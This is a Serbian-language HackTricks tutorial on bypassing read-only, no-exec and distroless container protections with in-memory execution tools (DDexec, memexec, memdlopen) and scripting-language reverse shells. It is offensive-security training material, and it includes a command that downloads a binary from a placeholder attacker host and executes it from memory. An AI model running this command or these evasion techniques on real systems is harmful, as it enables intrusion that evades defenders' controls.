# Zaobilaženje FS zaštita: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}


## Video-snimci

U sledećim video-snimcima možete pronaći detaljnije objašnjene tehnike pomenute na ovoj stranici:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

Sve je češći slučaj da se linux mašine pokreću sa **read-only (ro) zaštitom sistema datoteka**, naročito u kontejnerima. To je zato što je pokretanje kontejnera sa ro sistemom datoteka jednostavno kao postavljanje **`readOnlyRootFilesystem: true`** u `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Međutim, čak i ako je sistem datoteka montiran kao ro, **`/dev/shm`** će i dalje biti upisiv, pa je netačno da ne možemo ništa da upišemo na disk. Ipak, ovaj folder će biti **montiran sa no-exec zaštitom**, pa ako ovde preuzmete binary, **nećete moći da ga izvršite**.

> [!WARNING]
> Iz ugla red team-a, ovo **komplikuje preuzimanje i izvršavanje** binary-ja koji se već ne nalaze na sistemu (kao što su backdoor-i ili enumeratori poput `kubectl`).

## Najlakše zaobilaženje: Skripte

Imajte na umu da sam pomenuo binary-je: možete **izvršiti bilo koju skriptu** sve dok se interpreter nalazi na mašini, kao što je **shell script** ako je `sh` prisutan ili **python** **script** ako je `python` instaliran.

Međutim, ovo samo po sebi nije dovoljno za izvršavanje vašeg binary backdoor-a ili drugih binary alata koji bi mogli da vam budu potrebni.

## Zaobilaženje putem memorije

Ako želite da izvršite binary, ali sistem datoteka to ne dozvoljava, najbolji način je da ga **izvršite iz memorije**, pošto se **zaštite tamo ne primenjuju**.

### FD + exec syscall bypass

Ako na mašini imate neke moćne script engine-e, kao što su **Python**, **Perl** ili **Ruby**, možete preuzeti binary koji želite da izvršite iz memorije, smestiti ga u memory file descriptor (`create_memfd` syscall), na koji se te zaštite neće primenjivati, a zatim pozvati **`exec` syscall** i navesti **fd kao datoteku koju treba izvršiti**.

Za ovo možete jednostavno koristiti projekat [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Možete mu proslediti binary, a on će generisati script u navedenom jeziku sa **kompresovanim i b64 enkodovanim binary-jem**, kao i instrukcijama za njegovo **dekodiranje i dekompresovanje** u **fd** kreiran pozivanjem `create_memfd` syscall-a, uz poziv **exec** syscall-a za njegovo pokretanje.

> [!WARNING]
> Ovo ne funkcioniše u drugim scripting jezicima, kao što su PHP ili Node, zato što oni nemaju **podrazumevani način za pozivanje raw syscalls** iz skripte, pa nije moguće pozvati `create_memfd` radi kreiranja **memory fd-a** za smeštanje binary-ja.
>
> Pored toga, kreiranje **regularnog fd-a** sa datotekom u `/dev/shm` neće funkcionisati, jer nećete moći da je pokrenete pošto će se primeniti **no-exec zaštita**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) je tehnika koja vam omogućava da **izmenite memoriju sopstvenog procesa** prepisivanjem njegovog **`/proc/self/mem`**.

Prema tome, **kontrolisanjem assembly koda** koji proces izvršava, možete upisati **shellcode** i „mutirati“ proces tako da **izvrši proizvoljan kod**.

> [!TIP]
> **DDexec / EverythingExec** će vam omogućiti da učitate i **izvršite** sopstveni **shellcode** ili **bilo koji binary** iz **memorije**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Za više informacija o ovoj tehnici pogledajte Github ili:


{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) je prirodan sledeći korak nakon DDexec-a. To je **DDexec shellcode demonizovan**, tako da svaki put kada želite da **pokrenete drugi binary** ne morate ponovo da pokrećete DDexec; možete samo pokrenuti memexec shellcode pomoću DDexec tehnike, a zatim **komunicirati sa ovim daemon-om da biste prosledili nove binarne fajlove za učitavanje i pokretanje**.

Primer upotrebe alata **memexec za izvršavanje binarnih fajlova iz PHP reverse shell-a** možete pronaći na [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Sa sličnom namenom kao DDexec, tehnika [**memdlopen**](https://github.com/arget13/memdlopen) omogućava **jednostavniji način za učitavanje binarnih fajlova** u memoriju radi njihovog kasnijeg izvršavanja. Može omogućiti čak i učitavanje binarnih fajlova sa dependencies.

## Distroless Bypass

Za detaljno objašnjenje **šta distroless zapravo jeste**, kada pomaže, kada ne pomaže i kako menja post-exploitation pristup u kontejnerima, pogledajte:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Šta je distroless

Distroless kontejneri sadrže samo **apsolutni minimum komponenti neophodnih za pokretanje određene aplikacije ili servisa**, kao što su biblioteke i runtime dependencies, ali izostavljaju veće komponente poput package manager-a, shell-a ili sistemskih alata.

Cilj distroless kontejnera je da **smanje attack surface kontejnera uklanjanjem nepotrebnih komponenti** i minimizovanjem broja ranjivosti koje mogu biti iskorišćene.

### Reverse Shell

U distroless kontejneru možda **nećete pronaći čak ni `sh` ili `bash`** za dobijanje standardnog shell-a. Takođe nećete pronaći ni binarne fajlove kao što su `ls`, `whoami`, `id`... odnosno sve ono što obično pokrećete na sistemu.

> [!WARNING]
> Zbog toga **nećete moći** da dobijete **reverse shell** ili da **enumerate** sistem na uobičajen način.

Međutim, ako kompromitovani kontejner, na primer, pokreće Flask web aplikaciju, Python je instaliran i zato možete dobiti **Python reverse shell**. Ako pokreće Node, možete dobiti Node rev shell, a isto važi i za gotovo svaki **scripting language**.

> [!TIP]
> Korišćenjem scripting language-a mogli biste da **enumerate sistem** pomoću mogućnosti tog jezika.

Ako ne postoje **`read-only/no-exec`** zaštite, možete zloupotrebiti svoj reverse shell da **upišete svoje binarne fajlove u file system** i **izvršite** ih.

> [!TIP]
> Međutim, u ovoj vrsti kontejnera ove zaštite obično postoje, ali možete koristiti **prethodne memory execution tehnike da ih zaobiđete**.

Primeri o tome kako **iskoristiti neke RCE ranjivosti** za dobijanje **reverse shell-ova scripting language-a** i izvršavanje binarnih fajlova iz memorije dostupni su na [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../../banners/hacktricks-training.md}}
